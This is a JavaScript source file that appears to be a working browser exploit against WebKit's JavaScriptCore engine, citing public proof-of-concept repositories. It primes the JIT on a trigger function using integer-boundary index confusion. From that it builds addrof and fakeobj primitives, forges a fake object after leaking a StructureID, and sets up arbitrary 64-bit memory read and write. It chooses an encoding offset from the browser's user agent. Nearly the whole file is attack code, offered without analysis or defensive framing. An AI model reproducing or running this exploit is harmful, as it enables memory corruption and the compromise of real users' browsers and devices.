// ref: https://github.com/Billy-Ellis/coruna-buffout
const OOB_ARR = 201;
const OOB_ELEM = 2;

var t = null;
var g = null;


function hax(t, e, r, f, n, i, other_array, nested_idx, u, oob_value) {
    const target_array = t;
    let idx = e;
    const b = f;
    const k = n;
    const d = i;
    const len = target_array.length;

    for (let t = 0; t < 2; t++) {
    if (b === true) {
        if(!(idx === -2147483648)) return -1
    } else if (!(idx > 2147483647)) return -2;

    if (k === 0) idx = 0;

    if (idx < len) {
        if (k !== 0) idx -= 2147483647-7;
        
        if (idx < 0) return -3;

        // target_array[idx] = 2.66289667873244264257e-314;
        let t = target_array[idx]; // read the leaked data from t[201] array
        if (d) {
            target_array[idx] = r;

            if (u === 0) t = other_array[nested_idx][0];
            else other_array[nested_idx][0] = oob_value
        }
        return t
    }
    if( t > 0 ) break
    }
    return-4
}

function addrof(obj) {
    t[OOB_ARR][OOB_ELEM] = obj;
    return hax(t[200], -2147483648, 0, true, 1, false, g[0], 0, 0, 0);
}

function fakeobj(addr) {
    hax(t[200], -2147483648, addr, true, 1, true, g[0], 0, 0, 0);
    return t[OOB_ARR][OOB_ELEM];
}

const rwbuf = new ArrayBuffer(8);
const f64 = new Float64Array(rwbuf);
const u32 = new Uint32Array(rwbuf);

function f2i(val) {
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val) {
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

var JSValueDoubleEncodeOffset = (function () {
    var ua = navigator.userAgent;
    var m = ua.match(/Version\/(\d+)/) || ua.match(/[^\d]OS (\d+)[_ ]/);
    var v = m ? parseInt(m[1], 10) : 0;
    return (v >= 11 && v <= 13) ? 0x01000000000000 : 0x02000000000000;
})();

function i2obj(val) {
    return i2f(val - JSValueDoubleEncodeOffset);
}

function LeakStructureID(obj) {
    let container = {
        cellHeader: i2obj(0x0108200700000000),
        butterfly: obj
    };
    let fakeObj = fakeobj(i2f(f2i(addrof(container)) + 0x10));
    f64[0] = fakeObj[0];
    let structureID = u32[0];
    u32[1] = 0x01082307 - 0x20000;
    container.cellHeader = f64[0];
    return structureID;
}

function setup_rw() {
    // ref: https://github.com/wh1te4ever/WebKit-Bug-256172/blob/main/pwn.js#L257
    log("[i] " + navigator.userAgent + " -> offset 0x" + JSValueDoubleEncodeOffset.toString(16));

    let noCoW = 13.37;

    let structureID = LeakStructureID(new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8));
    log("[+] leak structureID: " + structureID);

    var pad = [{}, {}, {}];
    var victim = [noCoW, 14.47, 15.57];
    victim['prop'] = 13.37;
    victim['prop_1'] = 13.37;

    u32[0] = structureID;
    u32[1] = 0x01082309 - 0x20000;
    var container = {
        cellHeader: f64[0],
        butterfly: victim
    };
    var driver = fakeobj(i2f(f2i(addrof(container)) + 0x10));

    var unboxed = [noCoW, 13.37, 13.37];   
    var boxed = [{}];                     

    driver[1] = unboxed;
    var sharedButterfly = victim[1];
    log("[+] shared butterfly: 0x" + f2i(sharedButterfly).toString(16));

    driver[1] = boxed;
    victim[1] = sharedButterfly;

    u32[0] = structureID;
    u32[1] = 0x01082307 - JSValueDoubleEncodeOffset / 0x100000000;
    container.cellHeader = f64[0];

    function read64(addr) {
        driver[1] = i2f(addr + 0x10);
        boxed[0] = victim.prop;
        return f2i(unboxed[0]);
    }

    function write64(addr, val) {
        driver[1] = i2f(addr + 0x10);
        victim.prop = i2obj(val);
    }

    // check if r/w working
    var testArr = [noCoW, 2.2, 3.3];
    var bfly = read64(f2i(addrof(testArr)) + 8);
    var TESTVAL = 0x0008000041424344;
    log("[i] read64 work? " + (read64(bfly) === f2i(noCoW)));
    write64(bfly, TESTVAL);
    log("[i] write64 work? " + (f2i(testArr[0]) === TESTVAL));

    window.read64 = read64;
    window.write64 = write64;
}

function pwn() {
    log("[+] setting up stuff...");

    t = new Array(400);  // Main array, 400 elements
    t.fill([]);

    let currentTarget = null;
    let triggerValue = 0;
    let triggerReplace = null;
    let triggerFlag1 = -1;
    let triggerFlag2 = -1;

    g = new Array(16).fill([]).map((_, r) => {
        const i = JSON.parse("[[1.1, 1.2], [1.2, 1.3], [1.3, 3.4]]");
        for (const t of i) {
            t[0] = 0.1 + r;
            t["a" + r] = r;
        }
        return i;
    });

    const y = 200;

    t = t.map(((t, r) => {
        const i = JSON.parse("[0.1, 0.3, 1.1, 2.3]");
        if (i[0] = .1 + r, r !== y) {
            i[0] = [];
            for (const k in i) i[k] = 0.1 + r + (+k) / 100;
        }
        return i
    }));

    log("[+] prepping the jit...");

    const main_target_array = t[200];

    for (let iter = 0; iter < 1000000; iter++) {
        currentTarget = main_target_array;
        triggerReplace = iter % 2 != 0 ? 0.1 : 0.2;
        triggerValue = -2147483648;     // INT32_MIN  
        triggerFlag1 = true;
        triggerFlag2 = 0;

        hax(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2,
        true, g[iter % g.length], 0, iter % 2, 0.1 + iter);

        triggerValue = 2147483647 - iter % 3;  // INT32_MAX or close to it
        triggerFlag1 = !(1 & iter);             // alternating boolean
        triggerFlag2 = 0 + iter % 3;            // 0, 1, or 2

        hax(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2,
        false, g[iter % g.length], 0, iter % 2, 0.1 + iter);
    }

    log("[+] jit'd our trigger function");

    setup_rw();

    t[OOB_ARR][OOB_ELEM] = {};
}
